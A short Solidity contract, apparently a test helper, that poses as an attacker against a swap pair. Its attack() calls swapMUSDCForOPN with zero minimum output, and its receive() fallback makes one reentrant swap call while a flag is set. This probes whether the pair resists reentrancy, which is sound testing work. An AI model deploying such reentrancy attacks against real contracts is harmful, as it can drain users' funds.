// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IPair {
    function swapMUSDCForOPN(uint256 mUSDCIn, uint256 minOut) external returns (uint256);
}

contract MaliciousSwapAttacker {
    IPair public immutable pair;
    bool public attacking;

    constructor(address _pair) {
        pair = IPair(_pair);
    }

    function attack(uint256 mUSDCIn) external {
        attacking = true;
        pair.swapMUSDCForOPN(mUSDCIn, 0);
    }

    receive() external payable {
        if (attacking) {
            attacking = false; // single re-entry attempt
            pair.swapMUSDCForOPN(1, 0);
        }
    }
}
